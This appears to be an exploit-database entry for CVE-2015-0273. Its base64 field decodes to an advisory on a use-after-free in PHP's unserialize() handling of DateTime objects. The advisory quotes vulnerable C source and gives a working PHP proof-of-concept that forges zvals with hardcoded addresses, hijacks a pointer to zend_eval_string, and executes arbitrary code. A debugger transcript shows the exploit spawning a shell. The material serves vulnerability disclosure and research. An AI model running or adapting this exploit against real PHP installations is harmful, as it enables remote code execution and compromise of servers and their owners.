{
    "source": "exploit-database", 
    "exploit": "VXNlIEFmdGVyIEZyZWUgVnVsbmVyYWJpbGl0eSBpbiB1bnNlcmlhbGl6ZSgpIHdpdGggRGF0ZVRpbWUqIFtDVkUtMjAxNS0wMjczXQ0KDQpUYW9ndWFuZyBDaGVuIDxbQGNodGddKGh0dHA6Ly9naXRodWIuY29tL2NodGcpPiAtIFdyaXRlIERhdGU6DQoyMDE1LjEuMjkgLSBSZWxlYXNlIERhdGU6IDIwMTUuMi4yMA0KDQpBIHVzZS1hZnRlci1mcmVlIHZ1bG5lcmFiaWxpdHkgd2FzIGRpc2NvdmVyZWQgaW4gdW5zZXJpYWxpemUoKSB3aXRoIERhdGVUaW1lL0RhdGVUaW1lWm9uZS9EYXRlSW50ZXJ2YWwvRGF0ZVBlcmlvZCBvYmplY3RzJ3MgX193YWtldXAoKSBtYWdpYyBtZXRob2QgdGhhdCBjYW4gYmUgYWJ1c2VkIGZvciBsZWFraW5nIGFyYml0cmFyeSBtZW1vcnkgYmxvY2tzIG9yIGV4ZWN1dGUgYXJiaXRyYXJ5IGNvZGUgcmVtb3RlbHkuDQoNCkFmZmVjdGVkIFZlcnNpb25zDQotLS0tLS0tLS0tLS0NCkFmZmVjdGVkIGlzIFBIUCA1LjYgPCA1LjYuNg0KQWZmZWN0ZWQgaXMgUEhQIDUuNSA8IDUuNS4yMg0KQWZmZWN0ZWQgaXMgUEhQIDUuNCA8IDUuNC4zOA0KDQpDcmVkaXRzDQotLS0tLS0tLS0tLS0NClRoaXMgdnVsbmVyYWJpbGl0eSB3YXMgZGlzY2xvc2VkIGJ5IFRhb2d1YW5nIENoZW4uDQoNCkRlc2NyaXB0aW9uDQotLS0tLS0tLS0tLS0NCg0Kc3RhdGljIGludCBwaHBfZGF0ZV9pbml0aWFsaXplX2Zyb21faGFzaChwaHBfZGF0ZV9vYmogKipkYXRlb2JqLA0KSGFzaFRhYmxlICpteWh0KQ0Kew0KCXp2YWwgICAgICAgICAgICAgKnpfZGF0ZTsNCgl6dmFsICAgICAgICAgICAgICp6X3RpbWV6b25lOw0KCXp2YWwgICAgICAgICAgICAgKnpfdGltZXpvbmVfdHlwZTsNCgl6dmFsICAgICAgICAgICAgICB0bXBfb2JqOw0KCXRpbWVsaWJfdHppbmZvICAgKnR6aTsNCglwaHBfdGltZXpvbmVfb2JqICp0em9iajsNCg0KCXpfZGF0ZSA9IHplbmRfaGFzaF9zdHJfZmluZChteWh0LCAiZGF0ZSIsIHNpemVvZigiZGF0YSIpLTEpOw0KCWlmICh6X2RhdGUpIHsNCgkJY29udmVydF90b19zdHJpbmcoel9kYXRlKTsNCgkJel90aW1lem9uZV90eXBlID0gemVuZF9oYXNoX3N0cl9maW5kKG15aHQsICJ0aW1lem9uZV90eXBlIiwNCnNpemVvZigidGltZXpvbmVfdHlwZSIpLTEpOw0KCQlpZiAoel90aW1lem9uZV90eXBlKSB7DQoJCQljb252ZXJ0X3RvX2xvbmcoel90aW1lem9uZV90eXBlKTsNCgkJCXpfdGltZXpvbmUgPSB6ZW5kX2hhc2hfc3RyX2ZpbmQobXlodCwgInRpbWV6b25lIiwgc2l6ZW9mKCJ0aW1lem9uZSIpLTEpOw0KCQkJaWYgKHpfdGltZXpvbmUpIHsNCgkJCQljb252ZXJ0X3RvX3N0cmluZyh6X3RpbWV6b25lKTsNCg0KLi4uDQoNCnN0YXRpYyBpbnQgcGhwX2RhdGVfdGltZXpvbmVfaW5pdGlhbGl6ZV9mcm9tX2hhc2goenZhbCAqKnJldHVybl92YWx1ZSwNCnBocF90aW1lem9uZV9vYmogKip0em9iaiwgSGFzaFRhYmxlICpteWh0IFRTUk1MU19EQykNCnsNCgl6dmFsICAgICAgICAgICAgKip6X3RpbWV6b25lID0gTlVMTDsNCgl6dmFsICAgICAgICAgICAgKip6X3RpbWV6b25lX3R5cGUgPSBOVUxMOw0KDQoJaWYgKHplbmRfaGFzaF9maW5kKG15aHQsICJ0aW1lem9uZV90eXBlIiwgMTQsICh2b2lkKiopDQomel90aW1lem9uZV90eXBlKSA9PSBTVUNDRVNTKSB7DQoJCWlmICh6ZW5kX2hhc2hfZmluZChteWh0LCAidGltZXpvbmUiLCA5LCAodm9pZCoqKSAmel90aW1lem9uZSkgPT0gU1VDQ0VTUykgew0KCQkJY29udmVydF90b19sb25nKCp6X3RpbWV6b25lX3R5cGUpOw0KCQkJaWYgKFNVQ0NFU1MgPT0gdGltZXpvbmVfaW5pdGlhbGl6ZSgqdHpvYmosIFpfU1RSVkFMX1BQKHpfdGltZXpvbmUpDQpUU1JNTFNfQ0MpKSB7DQoJCQkJcmV0dXJuIFNVQ0NFU1M7DQoJCQl9DQoJCX0NCgl9DQoJcmV0dXJuIEZBSUxVUkU7DQp9DQoNClRoZSBjb252ZXJ0X3RvX2xvbmcoKSBsZWFkcyB0byB0aGUgWlZBTCBhbmQgYWxsIGl0cyBjaGlsZHJlbiBpcyBmcmVlZA0KZnJvbSBtZW1vcnkuIEhvd2V2ZXIgdGhlIHVuc2VyaWFsaXplKCkgY29kZSB3aWxsIHN0aWxsIGFsbG93IHRvIHVzZSBSOg0Kb3IgcjogdG8gc2V0IHJlZmVyZW5jZXMgdG8gdGhhdCBhbHJlYWR5IGZyZWVkIG1lbW9yeS4gVGhlcmUgaXMgYSB1c2UNCmFmdGVyIGZyZWUgdnVsbmVyYWJpbGl0eSwgYW5kIGFsbG93cyB0byBleGVjdXRlIGFyYml0cmFyeSBjb2RlLg0KDQpQcm9vZiBvZiBDb25jZXB0IEV4cGxvaXQNCi0tLS0tLS0tLS0tLQ0KVGhlIFBvQyB3b3JrcyBvbiBzdGFuZGFyZCBNYWNPU1ggMTAuMTAuMiBpbnN0YWxsYXRpb24gb2YgUEhQIDUuNS4xNC4NCg0KPD9waHANCg0KJGYgPSAkYXJndlsxXTsNCiRjID0gJGFyZ3ZbMl07DQoNCiRmYWtlenZhbDEgPSBwdHIyc3RyKDB4MTAwYjgzMDA4KTsNCiRmYWtlenZhbDEgLj0gcHRyMnN0cigweDgpOw0KJGZha2V6dmFsMSAuPSAiXHgwMFx4MDBceDAwXHgwMCI7DQokZmFrZXp2YWwxIC49ICJceDA2IjsNCiRmYWtlenZhbDEgLj0gIlx4MDAiOw0KJGZha2V6dmFsMSAuPSAiXHgwMFx4MDAiOw0KDQokZGF0YTEgPSAnYTozOntpOjA7TzoxMjoiRGF0ZVRpbWVab25lIjoyOntzOjEzOiJ0aW1lem9uZV90eXBlIjthOjE6e2k6MDtpOjE7fXM6ODoidGltZXpvbmUiO3M6MzoiVVRDIjt9aToxO3M6Jy5zdHJsZW4oJGZha2V6dmFsMSkuJzoiJy4kZmFrZXp2YWwxLiciO2k6MjthOjE6e2k6MDtSOjQ7fX0nOw0KDQokeCA9IHVuc2VyaWFsaXplKCRkYXRhMSk7DQokeSA9ICR4WzJdOw0KDQovLyB6ZW5kX2V2YWxfc3RyaW5nKCkncyBhZGRyZXNzDQokeVswXVswXSA9ICJceDZkIjsNCiR5WzBdWzFdID0gIlx4MWUiOw0KJHlbMF1bMl0gPSAiXHgzNSI7DQokeVswXVszXSA9ICJceDAwIjsNCiR5WzBdWzRdID0gIlx4MDEiOw0KJHlbMF1bNV0gPSAiXHgwMCI7DQokeVswXVs2XSA9ICJceDAwIjsNCiR5WzBdWzddID0gIlx4MDAiOw0KDQokZmFrZXp2YWwyID0gcHRyMnN0cigweDNiMjk2MzI0Mjg2NjI0KTsgLy8gJGYoJGMpOw0KJGZha2V6dmFsMiAuPSBwdHIyc3RyKDB4MTAwYjgzMDAwKTsNCiRmYWtlenZhbDIgLj0gIlx4MDBceDAwXHgwMFx4MDAiOw0KJGZha2V6dmFsMiAuPSAiXHgwNSI7DQokZmFrZXp2YWwyIC49ICJceDAwIjsNCiRmYWtlenZhbDIgLj0gIlx4MDBceDAwIjsNCg0KJGRhdGEyID0gJ2E6Mzp7aTowO086MTI6IkRhdGVUaW1lWm9uZSI6Mjp7czoxMzoidGltZXpvbmVfdHlwZSI7YToxOntpOjA7aToxO31zOjg6InRpbWV6b25lIjtzOjM6IlVUQyI7fWk6MTtzOicuc3RybGVuKCRmYWtlenZhbDIpLic6IicuJGZha2V6dmFsMi4nIjtpOjI7TzoxMjoiRGF0ZVRpbWVab25lIjoyOntzOjEzOiJ0aW1lem9uZV90eXBlIjthOjE6e2k6MDtSOjQ7fXM6ODoidGltZXpvbmUiO3M6MzoiVVRDIjt9fSc7DQoNCiR6ID0gdW5zZXJpYWxpemUoJGRhdGEyKTsNCg0KZnVuY3Rpb24gcHRyMnN0cigkcHRyKQ0Kew0KCSRvdXQgPSAiIjsNCglmb3IgKCRpPTA7ICRpPDg7ICRpKyspIHsNCgkJJG91dCAuPSBjaHIoJHB0ciAmIDB4ZmYpOw0KCQkkcHRyID4+PSA4Ow0KCX0NCglyZXR1cm4gJG91dDsNCn0NCg0KPz4NCg0KVGVzdCB0aGUgUG9DIG9uIHRoZSBjb21tYW5kIGxpbmUsIHRoZW4gYW55IFBIUCBjb2RlIGNhbiBiZSBleGVjdXRlZDoNCg0KJCBsbGRiIHBocA0KKGxsZGIpIHRhcmdldCBjcmVhdGUgInBocCINCkN1cnJlbnQgZXhlY3V0YWJsZSBzZXQgdG8gJ3BocCcgKHg4Nl82NCkuDQoobGxkYikgcnVuIHVhZnBvYy5waHAgYXNzZXJ0ICJzeXN0ZW1cKCdzaCdcKT09ZXhpdFwoXCkiDQpQcm9jZXNzIDEzNDcyIGxhdW5jaGVkOiAnL3Vzci9iaW4vcGhwJyAoeDg2XzY0KQ0Kc2g6IG5vIGpvYiBjb250cm9sIGluIHRoaXMgc2hlbGwNCnNoLTMuMiQgcGhwIC12DQpQSFAgNS41LjE0IChjbGkpIChidWlsdDogU2VwICA5IDIwMTQgMTk6MDk6MjUpDQpDb3B5cmlnaHQgKGMpIDE5OTctMjAxNCBUaGUgUEhQIEdyb3VwDQpaZW5kIEVuZ2luZSB2Mi41LjAsIENvcHlyaWdodCAoYykgMTk5OC0yMDE0IFplbmQgVGVjaG5vbG9naWVzDQpzaC0zLjIkIGV4aXQNCmV4aXQNClByb2Nlc3MgMTM0NzIgZXhpdGVkIHdpdGggc3RhdHVzID0gMCAoMHgwMDAwMDAwMCkNCihsbGRiKQ==", 
    "filename": "platforms/php/dos/36158.txt", 
    "id": "36158", 
    "cves": [
        "CVE-2015-0273"
    ]
}